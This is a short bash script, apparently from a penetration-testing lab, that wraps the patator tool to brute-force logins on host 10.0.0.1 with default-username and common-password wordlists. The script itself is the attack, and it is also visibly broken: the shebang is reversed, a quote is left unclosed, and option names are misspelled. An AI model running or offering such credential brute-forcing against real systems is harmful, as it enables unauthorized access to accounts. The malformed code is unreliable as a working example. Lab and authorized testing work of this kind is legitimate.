!#/bin/bash

attack=$1

python /patator/patator.py "$attack$ host=10.0.0.1 user=cirt-default-usernames.txt password=2020-200_most_used_passwords.txt 0=logins.txt 1=passwords.txt -x ingnore:message='Login incorrect.' -x ignmore,reset,retry:code=500
